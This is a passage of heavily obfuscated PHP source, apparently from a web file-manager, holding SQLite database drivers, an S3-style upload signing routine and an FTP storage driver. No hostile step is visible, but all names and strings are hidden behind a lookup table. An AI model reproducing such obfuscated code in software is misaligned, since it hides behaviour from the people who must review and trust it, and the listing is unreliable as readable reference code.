} return $†ÒÕœü; } public function getTables($áöİñ‹ = '') { $©í§¿¢… =& $_SERVER[³à¼î¯á]; $ë¶¤œ€ = $this->query($©í§¿¢…[45] . $©í§¿¢…[46] . $©í§¿¢…[47]); $Õó‰ŠæŞ = array(); foreach ($ë¶¤œ€ as $ÛªÍÕ×İ => $¢Ÿƒ…ô…) { $Õó‰ŠæŞ[$ÛªÍÕ×İ] = current($¢Ÿƒ…ô…); } return $Õó‰ŠæŞ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÓŞéÒ¿Â =& $_SERVER[³à¼î¯á]; $÷‘ÚÓËæ = sqlite_last_error($this->_linkID); $this->error = $÷‘ÚÓËæ . $ÓŞéÒ¿Â[4] . sqlite_error_string($÷‘ÚÓËæ); if ($ÓŞéÒ¿Â[12] != $this->queryStr) { $this->error .= LNG($ÓŞéÒ¿Â[48]) . $this->queryStr; } think_trace($this->error, $ÓŞéÒ¿Â[12], $ÓŞéÒ¿Â[49]); return $this->error; } public function escapeString($¥ÇÂÑ“†) { return sqlite_escape_string($¥ÇÂÑ“†); } public function parseLimit($‘Ó›Œ¡é) { $·ù¤é° =& $_SERVER[³à¼î¯á]; $¿èšç»Ê = $·ù¤é°[12]; if (!empty($‘Ó›Œ¡é)) { $‘Ó›Œ¡é = explode($·ù¤é°[50], $‘Ó›Œ¡é); if (count($‘Ó›Œ¡é) > 1) { $¿èšç»Ê .= $·ù¤é°[51] . $‘Ó›Œ¡é[1] . $·ù¤é°[52] . $‘Ó›Œ¡é[0] . $·ù¤é°[53]; } else { $¿èšç»Ê .= $·ù¤é°[51] . $‘Ó›Œ¡é[0] . $·ù¤é°[53]; } } return $¿èšç»Ê; } } class DbSqlite3Base extends Db { public function __construct($Œã’ÙíÈ = '') { $Õ­úÓæ =& $_SERVER[³à¼î¯á]; if (!class_exists($Õ­úÓæ[54])) { think_exception(think_lang($Õ­úÓæ[14]) . $Õ­úÓæ[55]); } if (!empty($Œã’ÙíÈ)) { if (!isset($Œã’ÙíÈ[$Õ­úÓæ[16]])) { $Œã’ÙíÈ[$Õ­úÓæ[16]] = 438; } $this->config = $Œã’ÙíÈ; if (empty($this->config[$Õ­úÓæ[17]])) { $this->config[$Õ­úÓæ[17]] = array(); } } } public function connect($ø±Ø›úÍ = '', $¤±õİä = 0) { $ç¿­şúğ =& $_SERVER[³à¼î¯á]; if (!isset($this->linkID[$¤±õİä])) { if (empty($ø±Ø›úÍ)) { $ø±Ø›úÍ = $this->config; } $this->linkID[$¤±õİä] = new SQLite3($ø±Ø›úÍ[$ç¿­şúğ[21]]); if (!$this->linkID[$¤±õİä]) { think_exception($this->linkID[$¤±õİä]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¤±õİä]->busyTimeout(30000); if (1 != think_config($ç¿­şúğ[22])) { unset($this->config); } } return $this->linkID[$¤±õİä]; } public function free() { $this->queryID = null; } public function query($ûŞ¥¥Äî) { $úÉ‚¤Ş =& $_SERVER[³à¼î¯á]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ûŞ¥¥Äî; if ($this->queryID) { $this->free(); } think_action_status($úÉ‚¤Ş[23], 1); think_status($úÉ‚¤Ş[24]); $this->queryID = $this->_linkID->query($ûŞ¥¥Äî); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¶‹ïñ”ì = $this->getAll(); $this->numRows = count($¶‹ïñ”ì); return $¶‹ïñ”ì; } } public function execute($Äéâ² §) { $ „íîİ =& $_SERVER[³à¼î¯á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Äéâ² §; if ($this->queryID) { $this->free(); } think_action_status($ „íîİ[25], 1); think_status($ „íîİ[24]); $Àë¿Á‰ = $this->_linkID->exec($Äéâ² §); $this->debug(); if (!1 === $Àë¿Á‰) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[³à¼î¯á][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ıî“û = $this->_linkID->query($_SERVER[³à¼î¯á][27]); if (!$ıî“û) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Š¦èäÀ = $this->_linkID->query($_SERVER[³à¼î¯á][28]); if (!$Š¦èäÀ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ã’íÛ• = array(); while ($”ŒÒÇñ– = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ã’íÛ•[] = $”ŒÒÇñ–; } $this->queryID->reset(); return $Ã’íÛ•; } public function getFields($ìÒ²úí) { $ÉÓØë¼ı =& $_SERVER[³à¼î¯á]; $ìíë˜±² = $this->query($ÉÓØë¼ı[29] . $ìÒ²úí . $ÉÓØë¼ı[30]); $Ç¨¤‘¾Ñ = array(); if ($ìíë˜±²) { foreach ($ìíë˜±² as $Ôşé¥ => $êîƒÇ®) { $Ç¨¤‘¾Ñ[$êîƒÇ®[$ÉÓØë¼ı[32]]] = array($ÉÓØë¼ı[32] => $êîƒÇ®[$ÉÓØë¼ı[32]], $ÉÓØë¼ı[33] => $êîƒÇ®[$ÉÓØë¼ı[33]], $ÉÓØë¼ı[35] => (bool) ($êîƒÇ®[$ÉÓØë¼ı[35]] === $ÉÓØë¼ı[12]), $ÉÓØë¼ı[37] => $êîƒÇ®[$ÉÓØë¼ı[56]], $ÉÓØë¼ı[39] => (bool) $êîƒÇ®[$ÉÓØë¼ı[57]], $ÉÓØë¼ı[42] => (bool) $êîƒÇ®[$ÉÓØë¼ı[57]]); } } return $Ç¨¤‘¾Ñ; } public function getTables($‚¼ØÅåş = '') { $Îë‹˜ğ‚ =& $_SERVER[³à¼î¯á]; $ÑÚ±Šµ÷ = $this->query($Îë‹˜ğ‚[45] . $Îë‹˜ğ‚[46] . $Îë‹˜ğ‚[47]); $ñ¥ıÏ¢Å = array(); foreach ($ÑÚ±Šµ÷ as $£Å¼‚†Û => $š¹£ÀŞå) { $ñ¥ıÏ¢Å[$£Å¼‚†Û] = current($š¹£ÀŞå); } return $ñ¥ıÏ¢Å; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¯Ê…•è— =& $_SERVER[³à¼î¯á]; $this->error = $this->_linkID->lastErrorMsg(); if ($¯Ê…•è—[12] != $this->queryStr) { $this->error .= LNG($¯Ê…•è—[48]) . $this->queryStr; } think_trace($this->error, $¯Ê…•è—[12], $¯Ê…•è—[49]); return $this->error; } public function escapeString($ÇçÑú·Û) { $ Ü¯Ã¢ä =& $_SERVER[³à¼î¯á]; if ($this->_linkID) { return $this->_linkID->escapeString($ÇçÑú·Û); } return str_ireplace($ Ü¯Ã¢ä[58], $ Ü¯Ã¢ä[59], $ÇçÑú·Û); } public function parseLimit($éíôËş) { $¹æ®Ô =& $_SERVER[³à¼î¯á]; $Í¡ó÷‚¹ = $¹æ®Ô[12]; if (!empty($éíôËş)) { $éíôËş = explode($¹æ®Ô[50], $éíôËş); if (count($éíôËş) > 1) { $Í¡ó÷‚¹ .= $¹æ®Ô[51] . $éíôËş[1] . $¹æ®Ô[52] . $éíôËş[0] . $¹æ®Ô[53]; } else { $Í¡ó÷‚¹ .= $¹æ®Ô[51] . $éíôËş[0] . $¹æ®Ô[53]; } } return $Í¡ó÷‚¹; } } goto F²ƒÁ†ù¨; c‰¤‘–£š: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($çñÌ©€Û) { parent::__construct($çñÌ©€Û); $this->setSignVersion($_SERVER[³à¼î¯á][238]); } public function uploadFormData($¦‡ã‘ù¥, $˜™­¡Ñœ = 3600) { $ğ¯è¸´è =& $_SERVER[³à¼î¯á]; $ÈÈıŠ´ = $ğ¯è¸´è[220]; $‚Îİ–õ = $ğ¯è¸´è[261]; $ ¸Êú•… = $ğ¯è¸´è[62]; $ı«÷ö¨ = gmdate($ğ¯è¸´è[262]); $ ûòï” = gmdate($ğ¯è¸´è[263]); $Ô”°Š˜É = $ğ¯è¸´è[264]; $—‚ş¦—Æ = $˜™­¡Ñœ . $ğ¯è¸´è[12]; $Ïûü›Œœ = $ğ¯è¸´è[265]; $°”íäôÇ = array($this->accessKey, $ ûòï”, $this->region, $ ¸Êú•…, $Ô”°Š˜É); $ìÎ‘»½™ = implode($ğ¯è¸´è[8], $°”íäôÇ); $Úò¡Ÿâ = array($ğ¯è¸´è[266] => gmdate($ğ¯è¸´è[1380], strtotime($ğ¯è¸´è[268])), $ğ¯è¸´è[269] => array(array($ğ¯è¸´è[270] => $this->bucket), array($ğ¯è¸´è[271] => $ÈÈıŠ´), array($ğ¯è¸´è[272], $ğ¯è¸´è[273], $ğ¯è¸´è[12]), array($ğ¯è¸´è[272], $ğ¯è¸´è[274], $ğ¯è¸´è[12]), array($ğ¯è¸´è[272], $ğ¯è¸´è[275], $ğ¯è¸´è[12]), array($ğ¯è¸´è[276] => $Ïûü›Œœ), array($ğ¯è¸´è[277] => $ìÎ‘»½™), array($ğ¯è¸´è[278] => $‚Îİ–õ), array($ğ¯è¸´è[279] => $ı«÷ö¨), array($ğ¯è¸´è[280] => $—‚ş¦—Æ))); $ªÎ‰•—“ = base64_encode(json_encode($Úò¡Ÿâ)); $İÒØˆÆà = hash_hmac($ğ¯è¸´è[281], $ ûòï”, $ğ¯è¸´è[282] . $this->secret, !0); $˜ã©äÛï = hash_hmac($ğ¯è¸´è[281], $this->region, $İÒØˆÆà, !0); $ãš¶•ß = hash_hmac($ğ¯è¸´è[281], $ ¸Êú•…, $˜ã©äÛï, !0); $öÍÛİÍæ = hash_hmac($ğ¯è¸´è[281], $Ô”°Š˜É, $ãš¶•ß, !0); $¶‰ÍøĞ– = hash_hmac($ğ¯è¸´è[281], $ªÎ‰•—“, $öÍÛİÍæ); $É©ĞÛâÛ = array($ğ¯è¸´è[237] => $ğ¯è¸´è[12], $ğ¯è¸´è[283] => $ğ¯è¸´è[12], $ğ¯è¸´è[271] => $ÈÈıŠ´, $ğ¯è¸´è[276] => $Ïûü›Œœ, $ğ¯è¸´è[284] => $ªÎ‰•—“, $ğ¯è¸´è[285] => $ìÎ‘»½™, $ğ¯è¸´è[286] => $‚Îİ–õ, $ğ¯è¸´è[287] => $ı«÷ö¨, $ğ¯è¸´è[288] => $—‚ş¦—Æ, $ğ¯è¸´è[289] => $¶‰ÍøĞ–, $ğ¯è¸´è[199] => $this->getHost()); return $É©ĞÛâÛ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Áõ¯Ëğ´) { parent::__construct(); if (count($Áõ¯Ëğ´) > 0) { $this->_init($Áõ¯Ëğ´); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($­‰Şè‹) { $ª×•¥şÕ =& $_SERVER[³à¼î¯á]; global $config; $this->appCharset = $config[$ª×•¥şÕ[1406]]; $this->systemCharset = $config[$ª×•¥şÕ[1407]]; if (isset($­‰Şè‹[$ª×•¥şÕ[1408]]) && $­‰Şè‹[$ª×•¥şÕ[1408]]) { $this->systemCharset = $­‰Şè‹[$ª×•¥şÕ[1408]]; } } public function iconvApp($œğÅ¢òÀ) { return $this->iconvTo($œğÅ¢òÀ, $this->systemCharset, $this->appCharset); } public function iconvSystem($¨Ã²îîª) { return $this->iconvTo($¨Ã²îîª, $this->appCharset, $this->systemCharset); } public function getPathOuter($ñÎŒË”¿) { $õ¿‡…³ä =& $_SERVER[³à¼î¯á]; $ ·²¦óó = $this->iconvApp($this->pathBase); $ñÎŒË”¿ = $this->iconvApp($ñÎŒË”¿); if (substr($ ·²¦óó, 0, 2) == $õ¿‡…³ä[1409]) { $ ·²¦óó = BASIC_PATH . substr($ ·²¦óó, 2); } if (substr($ñÎŒË”¿, 0, 2) == $õ¿‡…³ä[1409]) { $ñÎŒË”¿ = BASIC_PATH . substr($ñÎŒË”¿, 2); } $ ·²¦óó = KodIO::clear($ ·²¦óó); $ñÎŒË”¿ = KodIO::clear($ñÎŒË”¿); $ñÎŒË”¿ = substr($ñÎŒË”¿, strlen($ ·²¦óó)); if (empty($this->pathDriver)) { return $ñÎŒË”¿; } return $this->pathDriver . $õ¿‡…³ä[8] . ltrim($ñÎŒË”¿, $õ¿‡…³ä[8]); } private function _init($ºÇáÚ· = array()) { $ì”ñúÉÏ =& $_SERVER[³à¼î¯á]; if (!function_exists($ì”ñúÉÏ[1410])) { throw new Exception(LNG($ì”ñúÉÏ[1411])); } $this->config = $ºÇáÚ·; $this->charsetReset($ºÇáÚ·); foreach ($ºÇáÚ· as $³Ü°±Ë¯ => $ùºÛ³ñ„) { if (isset($this->{$³Ü°±Ë¯})) { $this->{$³Ü°±Ë¯} = $ùºÛ³ñ„; } } return $this->_login($ºÇáÚ·); } private function _login($¬®’›ÆŒ) { $³ï†¨× =& $_SERVER[³à¼î¯á]; static $ğØ‘ùúÒ = array(); $˜‹™®ò— = md5(json_encode($¬®’›ÆŒ)); if (isset($ğØ‘ùúÒ[$˜‹™®ò—])) { foreach ($ğØ‘ùúÒ[$˜‹™®ò—] as $ï¡©Ñ† => $¨™ı˜¦) { $this->{$ï¡©Ñ†} = $¨™ı˜¦; } return !0; } $âµ…“Ğ = parse_url(trim($this->server, $³ï†¨×[8])); $this->host = $âµ…“Ğ[$³ï†¨×[199]]; $”Ğ’…Ï = isset($âµ…“Ğ[$³ï†¨×[198]]) && $âµ…“Ğ[$³ï†¨×[198]] == $³ï†¨×[1412] ? !0 : !1; $this->scheme = $”Ğ’…Ï ? $³ï†¨×[1413] : $³ï†¨×[1414]; $this->port = isset($âµ…“Ğ[$³ï†¨×[200]]) ? $âµ…“Ğ[$³ï†¨×[200]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($³ï†¨×[1415]) . $this->host . $³ï†¨×[4] . $this->port, !0); return !1; } $òä²¦’ë = @ftp_login($this->connect, $this->username, $this->userpass); if (!$òä²¦’ë) { $this->writeLog(LNG($³ï†¨×[1416]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¿«ŞÈ‚ = $this->pasv == $³ï†¨×[91] ? !0 : !1; @ftp_pasv($this->connect, $¿«ŞÈ‚); $ğØ‘ùúÒ[$˜‹™®ò—] = array($³ï†¨×[1417] => $this->connect, $³ï†¨×[199] => $this->host, $³ï†¨×[198] => $this->scheme, $³ï†¨×[200] => $this->port); return $òä²¦’ë; } private function _isconn($ÒÔğ£Šü = true) { if (is_resource($this->connect)) { return !0; } if (!$ÒÔğ£Šü) { return !1; } return $this->_login($this->config); } public function mkfile($Ş‚çã€Í, $üœ—£Ó› = '', $ÏÎ’Ö€ = REPEAT_RENAME) { if ($this->setContent($Ş‚çã€Í, $üœ—£Ó›)) { return $this->getPathOuter($Ş‚çã€Í); } $this->writeLog(LNG($_SERVER[³à¼î¯á][1418]), !0); return !1; } public function mkdir($¤ğƒçèÏ, $—Ô§™ŸÚ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¤ğƒçèÏ = $this->iconvSystem($¤ğƒçèÏ); if ($this->_isFolder($¤ğƒçèÏ) || @ftp_mkdir($this->connect, $¤ğƒçèÏ)) { return $this->getPathOuter($¤ğƒçèÏ); } if (!$this->mkdir($this->pathFather($¤ğƒçèÏ))) { return !1; } if ($¤ğƒçèÏ = @ftp_mkdir($this->connect, $¤ğƒçèÏ)) { return $this->getPathOuter($¤ğƒçèÏ); } $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } public function copyFile($®Ñ‚ğİ, $¼ºä¯¾) { if (!$this->_isconn()) { return !1; } $ĞäîÎˆ = $this->pathThis($this->iconvSystem($®Ñ‚ğİ)); $ÀôÉóŸÕ = $this->tempFile($ĞäîÎˆ); $ùû„¡ŞÎ = $this->iconvApp($ÀôÉóŸÕ); $this->download($®Ñ‚ğİ, $ùû„¡ŞÎ); $•¹¶éÇÍ = $this->upload($¼ºä¯¾, $ùû„¡ŞÎ); $this->tempFileRemve($ÀôÉóŸÕ); return $•¹¶éÇÍ; } public function moveFile($¥²‡ßœÒ, $İè²¥­ï) { if (!$this->_isconn()) { return !1; } $¥²‡ßœÒ = $this->iconvSystem($¥²‡ßœÒ); $İè²¥­ï = $this->iconvSystem($İè²¥­ï); $ç‘ó¡Æ’ = @ftp_rename($this->connect, $¥²‡ßœÒ, $İè²¥­ï); if (!$ç‘ó¡Æ’) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } return $this->getPathOuter($İè²¥­ï); } public function delFile($–·Šª§®) { if (!$this->_isconn()) { return !1; } $–·Šª§® = $this->iconvSystem($–·Šª§®); $ˆ¬ï‰üü = @ftp_delete($this->connect, $–·Šª§®); if (!$ˆ¬ï‰üü) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); } return $ˆ¬ï‰üü; } public function delFolder($ÙÃãæè¯) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $§ª©›¾ = $áÁĞëÓ„ = array(); $this->fileList($ÙÃãæè¯, $§ª©›¾, $áÁĞëÓ„, !0); $this->listItemCache = !0; foreach ($áÁĞëÓ„ as $£’Û Çã) { $™’šÑ›Ì = $this->iconvSystem($£’Û Çã[$_SERVER[³à¼î¯á][32]]); $ÑË„Ó¬· = @ftp_delete($this->connect, $™’šÑ›Ì); if (!$ÑË„Ó¬·) { return !1; } } foreach ($§ª©›¾ as $™’šÑ›Ì) { $™’šÑ›Ì = $this->iconvSystem($™’šÑ›Ì); $ÑË„Ó¬· = @ftp_rmdir($this->connect, $™’šÑ›Ì); if (!$ÑË„Ó¬·) { return !1; } } $ÙÃãæè¯ = $this->iconvSystem($ÙÃãæè¯); return @ftp_rmdir($this->connect, $ÙÃãæè¯); } public function rename($ëü¡…­£, $•¡ûº›) { $¿×òÕé =& $_SERVER[³à¼î¯á]; if (!$this->_isconn()) { return !1; } $’°µúŒå = $this->fileNameAuto($this->pathFather($ëü¡…­£), $•¡ûº›); $’°µúŒå = $this->iconvSystem($’°µúŒå); $ëü¡…­£ = $this->iconvSystem($ëü¡…­£); $İ‹Ó˜‹İ = $this->pathFather($ëü¡…­£); $„¡¤††È = rtrim($İ‹Ó˜‹İ, $¿×òÕé[8]) . $¿×òÕé[8] . $’°µúŒå; $ì“¬©ƒ³ = @ftp_rename($this->connect, $ëü¡…­£, $„¡¤††È); if (!$ì“¬©ƒ³) { $this->writeLog(__FUNCTION__ . $¿×òÕé[1419], !0); return !1; } $„¡¤††È = $this->iconvApp($„¡¤††È); return $this->getPathOuter($„¡¤††È); } private function folderInfo($Ş¶¸ÃëÚ, $¤¤İÍÜì = false) { $ãø÷ Ï =& $_SERVER[³à¼î¯á]; $€í™„†¬ = array($ãø÷ Ï[32] => $this->pathThis($Ş¶¸ÃëÚ), $ãø÷ Ï[87] => $this->getPathOuter($ãø÷ Ï[8] . $Ş¶¸ÃëÚ), $ãø÷ Ï[33] => $ãø÷ Ï[78]); if ($¤¤İÍÜì) { return $€í™„†¬; } $€í™„†¬[$ãø÷ Ï[222]] = $€í™„†¬[$ãø÷ Ï[88]] = 0; $€í™„†¬[$ãø÷ Ï[223]] = $€í™„†¬[$ãø÷ Ï[224]] = !0; return $€í™„†¬; } private function fileInfo($üÌé¾öú, $û›æèÁæ = false, $Šù„Õ©Ï = array()) { $âß›îöÓ =& $_SERVER[³à¼î¯á]; $ğÇ›®ìª = array($âß›îöÓ[32] => $this->pathThis($üÌé¾öú), $âß›îöÓ[87] => $this->getPathOuter($âß›îöÓ[8] . $üÌé¾öú), $âß›îöÓ[33] => $âß›îöÓ[221], $âß›îöÓ[79] => isset($Šù„Õ©Ï[$âß›îöÓ[79]]) ? $Šù„Õ©Ï[$âß›îöÓ[79]] : 0, $âß›îöÓ[178] => $this->ext($üÌé¾öú)); if ($û›æèÁæ) { return $ğÇ›®ìª; } $ğÇ›®ìª[$âß›îöÓ[222]] = $ğÇ›®ìª[$âß›îöÓ[88]] = 0; $ğÇ›®ìª[$âß›îöÓ[223]] = $ğÇ›®ìª[$âß›îöÓ[224]] = !0; $âÔÌ˜» = $this->iconvSystem($üÌé¾öú); $ğÇ›®ìª[$âß›îöÓ[88]] = @ftp_mdtm($this->connect, $âÔÌ˜»); if (empty($Šù„Õ©Ï)) { $Šù„Õ©Ï = $this->objectMeta($üÌé¾öú); if (!$Šù„Õ©Ï) { return $ğÇ›®ìª; } } $ğÇ›®ìª[$âß›îöÓ[79]] = $Šù„Õ©Ï[$âß›îöÓ[79]]; return $ğÇ›®ìª; } public function size($—“º÷›Ù) { $ˆØæéÚ = $this->objectMeta($—“º÷›Ù); return $ˆØæéÚ ? $ˆØæéÚ[$_SERVER[³à¼î¯á][79]] : 0; } public function info($”˜¼Şˆ‡) { if ($this->isFile($”˜¼Şˆ‡)) { return $this->fileInfo($”˜¼Şˆ‡, 0); } else { if ($this->isFolder($”˜¼Şˆ‡)) { return $this->folderInfo($”˜¼Şˆ‡); } } return !1; } private function fileList($ó¿Ö’‰â, &$Ú÷•åæÒ, &$ÌÙıû÷ß, $‘Àƒ‡³Š = false) { $üÍáà§ê =& $_SERVER[³à¼î¯á]; $ó¿Ö’‰â = $this->iconvSystem($ó¿Ö’‰â); if (!$this->isFolder($ó¿Ö’‰â)) { return !1; } @ftp_chdir($this->connect, $üÍáà§ê[8]); $ó¿Ö’‰â = rtrim($ó¿Ö’‰â, $üÍáà§ê[8]) . $üÍáà§ê[8]; check_abort(); $äù®ıü‰ = @ftp_rawlist($this->connect, $ó¿Ö’‰â); if (!$äù®ıü‰) { $äù®ıü‰ = array(); } $ü¹ ïşƒ = array($üÍáà§ê[10] => 1, $üÍáà§ê[1332] => 1); foreach ($äù®ıü‰ as $Ôî«Èßı) { $Œ†à‹ŸÉ = $this->_listItem($Ôî«Èßı); if ($Œ†à‹ŸÉ[0] == $üÍáà§ê[803]) { continue; } $ºá„íœ– = $Œ†à‹ŸÉ[8]; if (empty($ºá„íœ–) && $ºá„íœ– !== $üÍáà§ê[219] || isset($ü¹ ïşƒ[$ºá„íœ–])) { continue; } $ºá„íœ– = $this->iconvApp($ó¿Ö’‰â . ltrim($ºá„íœ–, $üÍáà§ê[8])); $ü†Íñ¬µ = array($üÍáà§ê[32] => $ºá„íœ–, $üÍáà§ê[33] => $üÍáà§ê[221], $üÍáà§ê[79] => $Œ†à‹ŸÉ[4]); if (substr($Ôî«Èßı, 0, 1) == $üÍáà§ê[1420]) { $ü†Íñ¬µ[$üÍáà§ê[33]] = $üÍáà§ê[78]; $ü†Íñ¬µ[$üÍáà§ê[79]] = 0; } $ï†îˆŒŞ = $ü†Íñ¬µ[$üÍáà§ê[33]] == $üÍáà§ê[78] ? !0 : !1; $this->cacheMethodInfoSet($ºá„íœ–, $ï†îˆŒŞ, $ü†Íñ¬µ); if ($ï†îˆŒŞ) { $Ú÷•åæÒ[] = $ºá„íœ–; if ($‘Àƒ‡³Š) { $this->fileList($ºá„íœ–, $Ú÷•åæÒ, $ÌÙıû÷ß, $‘Àƒ‡³Š); } continue; } $ÌÙıû÷ß[] = $ü†Íñ¬µ; } $this->cacheMethodInfoSet($ó¿Ö’‰â, !0); } private function _listItem($ÙŒãòÁ) { if (empty($ÙŒãòÁ)) { return array(); } $µ¦¶ÎÏ· = preg_split($_SERVER[³à¼î¯á][1421], $ÙŒãòÁ); if (count($µ¦¶ÎÏ·) <= 9) { return $µ¦¶ÎÏ·; } $µ¦¶ÎÏ·[8] = trim(substr($ÙŒãòÁ, strpos($ÙŒãòÁ, $µ¦¶ÎÏ·[7]) + strlen($µ¦¶ÎÏ·[7]))); return array_splice($µ¦¶ÎÏ·, 0, 9); } public function listPath($°Îëºş·, $«É¿àĞ„ = false) { $¥ÊÌçêÀ =& $_SERVER[³à¼î¯á]; if (!$this->_isconn()) { return !1; } $ƒ×ºĞ­ = $Ûé—Ú£ = array(); $this->fileList($°Îëºş·, $ƒ×ºĞ­, $Ûé—Ú£); foreach ($ƒ×ºĞ­ as $ëŞ¯®‰¯ => $ÏÆ“˜ü·) { $ƒ×ºĞ­[$ëŞ¯®‰¯] = $this->folderInfo($ÏÆ“˜ü·, $«É¿àĞ„); } foreach ($Ûé—Ú£ as $ëŞ¯®‰¯ => $ÏÆ“˜ü·) { $Ûé—Ú£[$ëŞ¯®‰¯] = $this->fileInfo($ÏÆ“˜ü·[$¥ÊÌçêÀ[32]], $«É¿àĞ„, $ÏÆ“˜ü·); } return array($¥ÊÌçêÀ[85] => $ƒ×ºĞ­, $¥ÊÌçêÀ[86] => $Ûé—Ú£); } public function has($·«öÀ–Ş, $ Ó‘è– = false, $ÔÙ¸¹ÃÜ = true) { $ëÃƒĞì» =& $_SERVER[³à¼î¯á]; $ŸşÖµ× = $»éŸ²Ö = array(); $ìú ÷Ä = $ Ó‘è– ? !0 : !1; $this->fileList($·«öÀ–Ş, $ŸşÖµ×, $»éŸ²Ö, $ìú ÷Ä); if ($ Ó‘è–) { return array($ëÃƒĞì»[230] => count($»éŸ²Ö), $ëÃƒĞì»[231] => count($ŸşÖµ×)); } if ($ÔÙ¸¹ÃÜ) { if (count($»éŸ²Ö)) { return !0; } } else { if (count($ŸşÖµ×)) { return !0; } } return !1; } public function listAll($«›ıí°) { $²‚ Øé =& $_SERVER[³à¼î¯á]; if (!$this->_isconn()) { return !1; } $Ëäí“øË = $—øï»‘Ï = array(); $this->fileList($«›ıí°, $Ëäí“øË, $—øï»‘Ï, !0); $û·½¢·æ = array_to_keyvalue($—øï»‘Ï, $²‚ Øé[32]); foreach ($Ëäí“øË as $‡ùªßŸ›) { if (is_string($‡ùªßŸ›)) { $û·½¢·æ[$‡ùªßŸ›] = array($²‚ Øé[79] => 0); } } return $this->listAllFiles($«›ıí°, $û·½¢·æ); } public function getContent($İêºÉ¢†) { if (!$this->_isconn()) { return !1; } $İêºÉ¢† = $this->iconvSystem($İêºÉ¢†); return $this->fileSubstr($İêºÉ¢†); } public function setContent($ÊÂ‰ÙÓ, $÷ª·¹îœ = '') { if (!$this->_isconn()) { return !1; } $ó”ÙŞ×ï = $this->pathThis($this->iconvSystem($ÊÂ‰ÙÓ)); $ŒÎ‰¹–Ó = $this->tempFile($ó”ÙŞ×ï); file_put_contents($ŒÎ‰¹–Ó, $÷ª·¹îœ); $·Öèë„‰ = $this->upload($ÊÂ‰ÙÓ, $this->iconvApp($ŒÎ‰¹–Ó)); $this->tempFileRemve($ŒÎ‰¹–Ó); return $·Öèë„‰; } public function fileSubstr($Ÿß„ş, $Ù—˜ÎÚÈ = 0, $êÖÂš°ô = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Ÿß„ş, $Ù—˜ÎÚÈ, $êÖÂš°ô); } private function ftpRequest($¸§›Ñ¯, $¸©Ÿ‡ÛÀ = 0, $ÏÊçò¿ = false) { $¸§›Ñ¯ = $this->iconvSystem($¸§›Ñ¯); $´ŞŞÉĞç = $this->scheme . $this->host . $_SERVER[³à¼î¯á][4] . $this->port; $®ÎÎÔ¶İ = curl_init(); curl_setopt($®ÎÎÔ¶İ, CURLOPT_URL, $´ŞŞÉĞç . $this->pathEncode($¸§›Ñ¯)); curl_setopt($®ÎÎÔ¶İ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ÏÊçò¿) { $ÜÄ„çôƒ = $¸©Ÿ‡ÛÀ + $ÏÊçò¿ - 1; curl_setopt($®ÎÎÔ¶İ, CURLOPT_RANGE, "{$¸©Ÿ‡ÛÀ}\55{$ÜÄ„çôƒ}"); } curl_setopt($®ÎÎÔ¶İ, CURLOPT_RETURNTRANSFER, 1); $­Ü…çô³ = curl_exec($®ÎÎÔ¶İ); curl_close($®ÎÎÔ¶İ); return $­Ü…çô³; } public function upload($àÅöÓºË, $–ûÈíµ‚, $¾íÜ†“½ = false, $ßÑÏÔâÑ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($àÅöÓºË))) { return !1; } $àÅöÓºË = $this->iconvSystem($àÅöÓºË); $–ûÈíµ‚ = $this->iconvSystem($–ûÈíµ‚); $ûÀëÄŠ‹ = ftp_nb_put($this->connect, $àÅöÓºË, $–ûÈíµ‚, FTP_BINARY); while ($ûÀëÄŠ‹ == FTP_MOREDATA) { $ûÀëÄŠ‹ = ftp_nb_continue($this->connect); } if ($ûÀëÄŠ‹ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } return $this->getPathOuter($àÅöÓºË); } public function download($‚¯Ì»ö¶, $‰Üœ¼øÌ = '') { if (!$this->_isconn()) { return !1; } $ÜƒŠô·’ = $this->pathFather($‰Üœ¼øÌ); if (!IO::mkdir($ÜƒŠô·’)) { return !1; } $‚¯Ì»ö¶ = $this->iconvSystem($‚¯Ì»ö¶); $‰Üœ¼øÌ = $this->iconvSystem($‰Üœ¼øÌ); $ŸÒØâ¿õ = ftp_nb_get($this->connect, $‰Üœ¼øÌ, $‚¯Ì»ö¶, FTP_BINARY); while ($ŸÒØâ¿õ == FTP_MOREDATA) { $ŸÒØâ¿õ = ftp_nb_continue($this->connect); } if ($ŸÒØâ¿õ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } return 